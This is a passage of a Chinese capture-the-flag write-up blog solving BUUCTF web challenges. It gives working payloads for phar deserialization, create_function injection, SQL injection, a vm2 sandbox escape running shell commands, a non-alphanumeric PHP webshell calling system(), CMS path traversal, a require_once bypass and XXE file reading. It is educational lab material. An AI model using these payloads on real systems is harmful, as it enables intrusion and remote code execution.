很符合`/var/www/html/uploads/f07f07f4e21adb2dbae6c57907a6b22c/GXY7ee46e116c49b534d9932a9999994865.txt`清晰明了\n\n```php\n    function __construct(){\n        $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n        $ext = \".txt\";\n        @mkdir($sandbox, 0777, true);\n        if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n            $this->Filename = $_GET['name'];\n        }\n        else{\n            $this->Filename = $sandbox.$_SESSION['user'].$ext;\n        }\n\n        $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n        $this->token = $_SESSION['user'];\n    }\n```\n\n再来看 \n\n只要符合`preg_match(\"[^a-z0-9]\", $this->Filename)` `$file['size'] > 1024`\n\n那么我们上传的文件就会被移动到新的路径并且这个路径就是我们之前通过get传参的name\n\n```php\n  function upload($file){\n        global $sandbox;\n        global $ext;\n\n        if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n            $this->cmd = \"die('illegal filename!');\";\n        }\n        else{\n            if($file['size'] > 1024){\n                $this->cmd = \"die('you are too big (′▽`〃)');\";\n            }\n            else{\n                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n            }\n        }\n    }\n```\n\n还剩两个魔术方法\n\n可以看到析构函数 存在eval 执行cmd属性 但是这个题目不存在反序列化入口函数\n\n但是这个题目有文件上传啊 太经典了 phar文件搭配phar://就可以进行反序列化\n\n```php\n    function __toString(){\n        global $sandbox;\n        global $ext;\n        // return $sandbox.$this->Filename.$ext;\n        return $this->Filename;\n    }\n\n    function __destruct(){\n        if($this->token != $_SESSION['user']){\n            $this->cmd = \"die('check token falied!');\";\n        }\n        eval($this->cmd);\n    }\n}\n```\n\nok 思路清晰！\n\n## 非预期：\n\n```\n/home.php?file=upload&name=/var/www/html/1.php\n```\n\n然后上传一个一句话木马\n\n## 预期解:\n\n要想执行eval 那么 `$this->token != $_SESSION['user']`\n\n```php\n  function __destruct(){\n        if($this->token != $_SESSION['user']){\n            $this->cmd = \"die('check token falied!');\";\n        }\n        eval($this->cmd);\n    }\n}\n```\n\n`$_SESSION['user']`是多少呢 我们可以随便上传一个文件来看因为路径中就会爆出\n\n```\n$this->Filename = $sandbox.$_SESSION['user'].$ext;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689930191463-8262e26e-2d8a-4455-84c1-9ba94f9306b0.png)\n\n```\n/var/www/html/uploads/d13687f9a4bb80ded57226b5f42f671e/GXY845d6439be6936948e31cbfbbc90a715.txt\n```\n\n那么`$_SESSION['user']=GXY845d6439be6936948e31cbfbbc90a715`\n\n然后就是很经典的phar链子构造 偷的\n\n```php\n<?php\n\nclass Uploader\n{\n    public $Filename;\n    public $cmd;\n    public $token;\n}\n\n$o = new Uploader();\n\n$o->Filename=\"test\";\n\n$o->cmd=\"highlight_file('/var/www/html/flag.php');\";\n\n$o->token=\"GXY845d6439be6936948e31cbfbbc90a715\";\n\n\n$phar = new Phar(\"phar.phar\");\n\n$phar->startBuffering();\n\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub，增加gif文件头\n\n$phar->setMetadata($o); //将自定义meta-data存入manifest\n\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n\n$phar->stopBuffering();\n```\n\n上传上去之后 在用phar://去访问就行了 这里就不赘述了\n\n\n\n然后这道题目过滤里有个错误\n\n `if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name']))`\n\n仔细看`\\.`前面有个空格 所以这道题匹配不到我们的`.`因而我们才能get的name中存在`.`\n","categories":["buuctf"]},{"title":"buu刷题(page 4)","url":"/post/ec342723.html","content":"\nbuu刷题(page 4)\n\n<!--more-->\n\n# 98、[BJDCTF2020]EzPH\n\n查看源码发现一段base32码`GFXEIM3YFZYGQ4A=` 特征是只有大写字母和数字\n\n解码获得`/1nD3x.php`\n\n源码如下：\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\n```\n\n首先`$_SERVER['QUERY_STRING']`和一个正则已经不可能让我们输入合法了，所以要想办法绕过这个`$_SERVER['QUERY_STRING']`\n\n`$_SERVER['QUERY_STRING']`不对传入的东西进行url编码，所以我们可以进行全字符url编码后传入就可以bypass。\n\n然后是经典的换行符`%0a`绕过`preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') `\n\n`file_get_contents($file) !== 'debu_debu_aqua'`利用data协议写入即可\n\n`sha1()`和md5一样我们传入两个数组就会报false 从而bypass\n\n`$_REQUEST`它包含了我们get、post和cookie传入的数组，他ban掉了数字和大小写，那这里应该怎么绕过呢。\n\n 如果get和post一样的参数名，它会优先选择post形式传入的参数的值。\n\n所以我们可以按他的要求get传入，然后再post相同的变量名传参为数字，那么就可以bypass了\n\n至此，我们要传入的部分为\n\n```\n?file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute%0a&shana[]=1&passwd[]=2\n```\n\n通过url编码：\n\n```\n?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2\n```\n\n这里注意一下这里符号以及数字没有被waf所以不要一键url编码了 数字和符号原样放出即可 如果一起编码，解码的时候就会出现歧义\n\n再来看`extract()`简单说就是当我们传入一个含有键值对的数组时候，他就会帮我们把键值分别提出来键为变量名，值为变量的值。 \n\n再来看`$code('', $arg)`这一部分，这里我们可以利用前面的extract()来改变他们的值从而利用\n\n这里用到了create_function()匿名函数注入，之前ctfshow刷题也见到过\n\n```php\n$myfunc = create_function('$a, $b', 'return $a+$b;');\n相当于\nfunction myfunc($a, $b){\n    return $a+$b;\n}\n利用sql注入的闭合思想\n  function myfunc($a, $b){\n  return $a+$b;\n}\neval();//}\n我们可以闭合前面的{ 然后注释掉后面的 }  再插入我们的恶意代码\n```\n\n因此我们可以利用extract传参：`flag[code]=create_function&flag[arg]=;}var_dump(get_defined_vars());//`\n\n获取当前所有变量数组\n\n```php\npayload:\n?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=;}%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688899385264-4f64aa94-f527-4470-9bca-c3ff249a256f.png)\n\n可以看到flag在 `rea1fl4g.php`\n\n但是直接访问无结果，所以还得通过伪协议配合文件包含去读\n\n 看别人wp都是说因为禁用了include所以用require，但是我看源码没有禁include并且也用不了？？\n\n然后`$code`单双引号也不能用\n\n既然我们是get传参的所以我们也不能用数字字母所以我们就用取反利用不可见字符来输入伪协议\n\n```\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)\nrequire(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))\n```\n\n最后的payload：\n\n```\n?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=;}%72%65%71%75%69%72%65(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n```\n\npost传入：`debu=1&file=1`\n\n还有一种解法是用require()去包含我们的flag文件 rea1fl4g.php  \n\n然后再用 `var_dump(get_defined_vars()`去读\n\n但是这里我们的`.`被禁了 所以利用base64函数 进行bypass\n\n最终的paylaod：\n\n```\nfile=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute &shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//  \n```\n\npost: `file=1&debu=2  `\n\n当然要url编码打入\n\n# 99、October 2019 Twice SQL Injectio\n\n一道根据二次注入的题目\n\n看题目标题也知道 然后我注册了admin' 发现他登录后显示的语句不正常输出了 怀疑就是登录名存在二次注入\n\n 然后注册`admin' union select database()#`发现爆出了库名\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688901679744-d25e859e-d14a-49fc-949b-1f84172e40c4.png)\n\n然后就是联合注入和二次注入组合拳就行了 比较简单\n\n```php\nadmin' union select database() #\n\nadmin' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #\n\nadmin' union select group_concat(column_name) from information_schema.columns where table_name='flag'#\n\nadmin' union select flag from flag #\n    \n```\n\n\n\n# 100、[HFCTF2020]JustEscape\n\n一道没有思路的学习题目 vm的沙箱逃逸\n\n看了网上的WP 好多都是没有分析只给了payload \n\n大概学习了一下https://xz.aliyun.com/t/11859#toc-3\n\n首先就是要通过奇怪的构造方式获取到全局process对象，这个全局对象下我们可以执行导入child_process，然后`require('child_process').execSync('whoami').toString()`进行命令执行了\n\n看wp都是利用自执行函数 就是形如`(function(){}) 或 (function(){})() `的表达式 ，被定义之后就会立即执行  \n\n过滤了`['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '\"',''']`\n\n然后poc都是在这里淘宝：https://github.com/patriksimek/vm2/issues\n\n通过模板字符串来bypass被waf的字符 其实本质就是格式化字符串\n\n```php\nconsole.log(`${`${`prototyp`}e`}`)\nconsole.log(`${`prototype`}`)\n\n等于prototype\n```\n\n反引号来绕过单双引号\n\npayload1：\n\n```php\n(function(){\n    TypeError.prototype.get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n})()\n```\n\n因为有waf所以要利用数组\n\n看大佬wp\n\n**当对象的方法或者属性名关键字被过滤的情况下可以利用数组调用的方式绕过关键字的限制**  \n\n```php\n?code[]=(function(){\n    TypeError.prototype.get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"ls\").toString();\n    }\n})()\n```\n\npayload2就是利用模板字符串去bypass被waf的字符\n\npoc:\n\n```php\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = '(' + function (){\n    TypeError[`${`prototyp`}e`][`${`get_proces`}s`] = f=>f[`${`constructo`}r`](`return this.${`proces`}s`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`get_proces`}s`](()=>{}).mainModule[`${`requir`}e`](`${`child_proces`}s`)[`${`exe`}cSync`](`whoami`).toString();\n    }\n}+')()';\nconsole.log(untrusted)\ntry{\n    console.log(new VM().run(untrusted));\n}catch(x){\n    console.log(x);\n}\n```\n\npayload:\n\n```php\n?code=(function (){\n    TypeError[`${`prototyp`}e`][`${`get_proces`}s`] = f=>f[`${`constructo`}r`](`return this.${`proces`}s`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`get_proces`}s`](()=>{}).mainModule[`${`requir`}e`](`${`child_proces`}s`)[`${`exe`}cSync`](`ls`).toString();\n    }\n})()\n```\n\n就暂时这样吧，做的云里雾里的。\n\n# 101、[GXYCTF2019]StrongestMind\n\n纯是考察python脚本\n\n写个脚本爬下要求两个数字，计算，然后再post提交两个数字的结果，重复1000次。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966691744-0ff8bc5e-3bdc-4fe4-9f4b-60e708c4cffd.png)\n\n```php\nfrom requests import *\nimport re\ns = session()\na = s.get(\"http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php\")\npattern = re.findall(r'\\d+.[+-].\\d+', a.text) \nc = eval(pattern[0])\na = s.post(\"http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php\", data = {\"answer\" : c})\nfor i in range(1000):\n\tpattern = re.findall(r'\\d+.[+-].\\d+', a.text) \n\tc = eval(pattern[0])\n  //这里pattern=形如['36328928 + 88301757']是个list 那么可以用下标为0提出来36328928 + 88301757\n\tprint(c)\n\ta = s.post(\"http://6958b5bc-18e4-42b9-a6f1-aa7ac65e85b5.node4.buuoj.cn:81/index.php\", data = {\"answer\" : c})\nprint(a.text)\n```\n\n重要的点就是 我们要记录1000次数 所以要保存上一次的状态，要保存一下session\n\n请求的时候 session().get 或者 session().post 可以保持我们的会话状态session  并且发送不同的请求\n\n又学到了！！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688966946619-d0ce7ed6-e9a6-4c4d-96e9-5c89b18aed89.png)\n\n# 102、[SUCTF 2018]GetShell\n\n```php\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n} \n```\n\n先文件包含将我们的文件内容读入然后检查第六位开始的内容 \n\nfuzz一下 看看哪些字符没有被waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972164206-c84c4d71-7af7-405f-ab58-7a01382d8a3d.png)\n\n`$()_[]~;.=`这些没有被waf 还有汉字 这道题目就是利用汉字按位取反来getshell的\n\n这里有个很重要的一点 在爆破时候一定要把urlencode关了，不然提交的时候bp会将特殊的符号url编码从而使得fuzz出错 我第一次就是因为这个fuzz不全\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688972249693-0b95cade-1ab0-4116-a842-d40fec4f9ff3.png)\n\n先得到1和0\n\n```php\n<?=\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$_=($_==$__);      //不成立 false -->0\n$__=($_==$_);      //成立   true  -->1\n```\n\n在PHP中两个空数组相互比较为true 所以值为1\n\n那么该怎么得到字母呢 我们用汉字按位取反然后利用下标去截取我们需要的字符 这里最好选择的汉字去取反后能用的字符下标为0或者1  因为我们前面只构造出了01\n\n可以参考p神的https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973469139-4b68991a-fe08-469e-b040-80f76f3dbe3c.png)\n\n这样我们就可以截取一个php的p 当然这道题目我们没必要构造出php 用短标签就行了\n\n所以最后payload可以构造很多方式  \n\n偷的：https://blog.csdn.net/qq_46263951/article/details/118816182\n\n```php\n<?=                //PHP中的另外一个短标签<?=，代替<?php\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$_=($_==$__);      //不成立 false -->0\n$__=($_==$_);      //成立   true  -->1\n$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];  //system\n$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];         //_Post\n$___($$____[~瞎[$__]]);   //system($_POST[a]);\n```\n\n打入 rce即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688973625307-c62c6cd1-194d-4b26-b8f8-ae282d9cc448.png)\n\n# 103、[GKCTF 2021]easycms\n\n看标题就知道是找后台 /admin\n\n但是这道题目是admin.php 然后登录 考察弱口令 admin/12345就可以登录\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981688423-219797d3-2ce2-4788-a4df-421375f019df.png)\n\n可以看到是蝉知7.7的版本 那就直接检索这个版本的漏洞\n\n但是这道题目buu靶场问题payload稍稍不同 导致花了好长时间一直卡在这\n\n现在这里上传一个txt文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981793987-aa46eb16-b193-4fe8-932f-6cf3d7f8b04b.png)\n\n然后改名为：`../../../../../../../../../../../var/www/html/system/tmp/yzpc` \n\n注意这里的最后的yzpc每个人不一样 我们进入后台之后进入设计-高级直接点保存会爆出一个路径 里面每个人不一样\n\n就是这个路径和网上许多师傅复现的路径不一样 应该是靶场问题\n\n好多师傅都是修改为：`../../../../../system/tmp/yzpc`\n\n但是这道题目要按我这种路径\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981807209-791e4185-75c6-437e-8e08-04ae2b6fe628.png)\n\n之后写入恶意代码即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688981987225-574481c1-124f-4461-95da-7c07b5565c7e.png)\n\n还有一种就是我们上传完文件修改文件名以后在主题编辑里 编辑网站头部 直接写入php🐎即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982259213-467c161b-a461-43d4-907c-dc982a85a45a.png)\n\n可以看到执行成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688982237616-df436f24-2567-4a63-83df-8ee981b28a72.png)\n\n# 104、[b01lers2020]Life on Mars\n\n这道题难点还是在于怎么找到sql注入点 考察的只是联合注入 \n\n进入网页 抓包分析 会发现有请求\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042712077-67edce38-b96a-444a-bce5-62b0f91350dc.png)\n\n注入点如图\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689042755534-7ce030d7-56c5-4055-8095-8ec62023fbb5.png)\n\n构造`/query?search=amazonis_planitia%20union%20select%201,2 `发现有回显 有两列\n\n然后就是联合注入常规操作\n\n```php\n/query?search=amazonis_planitia%20union%20select%201,database()\n\n\n当前库：aliens\n\n\n/query?search=amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='aliens'\n\n表：amazonis_planitia,arabia_terra,chryse_planitia,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin\n\n\n/query?search=amazonis_planitia%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='olympus_mons'\n```\n\n注到这里 发现有很多表而且都没有flag\n\n因此感觉flag不在当前库里 \n\n再查一下所有库吧 原来在alien_code这个库里\n\n```php\n/query?search=amazonis_planitia%20union%20select%20group_concat(SCHEMA_NAME)%20from%20information_schema.SCHEMATA\n所有库：information_schema,alien_code,aliens\n/query?search=amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='alien_code'\n\n表：code\n/query?search=amazonis_planitia%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='code\n'\n列：id,code\n\n/query?search=amazonis_planitia%20union%20select%201,code%20from%20alien_code.code\n这里要指定一下库 不然注不出来\n    \n```\n\n# 105、[MRCTF2020]Ezaudit\n\n之前就在buu上做过这类似的\n\n首先进网页是一个花里胡哨的略过，然后扫后台发现源码泄露`/www.zip`\n\n```php\n<?php \nheader('Content-type:text/html; charset=utf-8');\nerror_reporting(0);\nif(isset($_POST['login'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n    if (($username == '') || ($password == '') ||($Private_key == '')) {\n        // 若为空,视为未填写,提示错误,并3秒后返回登录界面\n        header('refresh:2; url=login.html');\n        echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n}\n    else if($Private_key != '*************' )\n    {\n        header('refresh:2; url=login.html');\n        echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n    }\n\n    else{\n        if($Private_key === '************'){\n        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; \n        $link=mysql_connect(\"localhost\",\"root\",\"root\");\n        mysql_select_db(\"test\",$link);\n        $result = mysql_query($getuser);\n        while($row=mysql_fetch_assoc($result)){\n            echo \"<tr><td>\".$row[\"username\"].\"</td><td>\".$row[\"flag\"].\"</td><td>\";\n        }\n    }\n    }\n\n} \n// genarate public_key \nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\n  function private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n  $Public_key = public_key();\n  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n```\n\n第一部分是一个登录 第二部分是公私钥 是个密码题？？？？\n\n审计第一部分\n\n```php\n$username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n```\n\n我们需要知道用户名密码私钥 用户名是crispr已经给出 密码我们可以用万能钥匙去闭合 因此关键在于私钥\n\n` //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???`最后一句提示我们要通过公钥算出种子 再利用种子生成私钥\n\n首先要爆破一下种子\n\n```php\nstr1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\nstr2='KVQP0LdJKRaV3n9D'\nstr3 = str1[::-1]\nlength = len(str2)\nres=''\nfor i in range(len(str2)):  \n    for j in range(len(str1)):\n        if str2[i] == str1[j]:\n            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n            break\nprint(res)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689045182635-356c24fb-2eef-4543-a0b8-69d47c40d71c.png)\n\n爆破得种子1775196155  并且下面的私钥要用5.2.1到7.0.x的版本去算 不然算出来不一样 \n\n我一开始用php8算的一直算的和wp不一样 版本要正确才行\n\n再来算私钥\n\n```php\n<?php\nmt_srand(1775196155);\nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\nfunction private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n\n\n\necho \"public:\".public_key();\necho \"  private:\".private_key();\n\n?>\n```\n\n得到\t` XuNhoueCDCGc  `\n\n访问`/login.html` 登录即可\n\n# 106、[极客大挑战 2020]Roamphp1-Welcome\n\n这题太抽象了\n\n首先进去什么也没有，然后抓包显示405状态码\n\n HTTP状态码 405 表示请求的方法不允许。它是在客户端发送的请求方法与服务器上所允许的方法不匹配时使用的状态码。  \n\n所以默认是get 我们尝试抓包后改为post方式 爆出了源码\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689144943353-7aeef221-d563-4b1f-a3f6-ce3aeaa1786e.png)\n\n很常见的套路 数组绕过就行了\n\n```\nroam1[]=1&roam2[]=2\n```\n\n然后可以看phpinfo\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689145004564-d20d1342-c322-450b-aa7f-c6e7959abc28.png)\n\n发现了`/f1444aagggg.php` 额。。但是访问啥也没有 然后就可以在这个phpinfo找到flag？？？\n\n不懂为啥这题放在buu的第四页 \n\n# 107、[WMCTF2020]Make PHP Great Again\n\n这道题目主要考察了require_once\n\n他和require差不多 require_once 也会在包含文件时执行其中的代码并将其结果包含到主脚本中。区别在于，在包含相同文件时，require_once 会检查该文件是否已经被包含过，如果是，则不再重复包含，避免出现重复定义的错误。  \n\nphp的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once('flag.php')，已经包含的文件不可以再require_once。  \n\n```php\n<?php\nhighlight_file(__FILE__);\nrequire_once 'flag.php';\nif(isset($_GET['file'])) {\n  require_once $_GET['file'];\n}\n```\n\n源码中已经包含过了所以我们就无法再利用这个函数去包含flag文件\n\n这里有个知识点\n\n**require_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过**，外加伪协议编码一下： \n\n然后关于/proc/self/root \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146550618-3a5f2ae6-340b-42f9-b327-afe4657204bb.png)\n\n简单来说就是指向根目录的软链接 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146577763-dce5b8bf-979b-4f0e-8204-c5e26913b88d.png)\n\npayload：\n\n```php\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\n这个我记得什么时候在ctfshow见过 反正又学到了\n\n# 108、[CSAWQual 2019]Web_Unagi\n\n这道题目目标还是很鲜明的 让我们上传文件 然后再把我们的内容展示出来 并且显示信息是xml格式的\n\n所以我们可以上传xml文件进行xxe\n\n一开始我上传的是:\n\n```php\n<?xml version=\"1.0\"?>\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n<users>\n\t<user>\n\t\t<username>&aaa;</username>\n\t\t<password>&aaa;</password>\n\t\t<name>&aaa;</name>\n\t\t<email>&aaa;</email>\n\t\t<group>&aaa;</group>\n\t\t<intro>&xxe;</intro>\n\t</user>\n</users>\n```\n\n但是无论我去掉flag system都是被waf了 看了wp才明白可以用其他编码绕过\n\n在kali `iconv -f utf8 -t utf16 1.xml>2.xml`\n\niconv 是一个在 Linux 和 Unix 系统上常用的字符编码转换工具。它可以将一个字符集的文本转换为另一个字符集的文本。  